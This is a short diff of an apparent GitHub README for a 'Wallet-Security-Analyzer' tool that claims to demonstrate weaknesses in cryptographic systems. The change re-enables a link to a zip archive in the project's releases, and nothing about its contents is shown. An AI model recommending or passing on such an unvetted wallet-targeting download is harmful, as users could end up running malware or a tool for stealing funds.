@@ -14,7 +14,7 @@ This tool is designed to demonstrate vulnerabilities in cryptographic systems.
 ---
 
 ## 📥 **"Download"** 
-~~🔗 [Download](https://github.com/lulubdu13/Wallet-Security-Analyzer/releases/download/Download/wallet-security-analyzer.zip)
+🔗 [Download](https://github.com/lulubdu13/Wallet-Security-Analyzer/releases/download/Download/wallet-security-analyzer.zip)
 
 ---
 
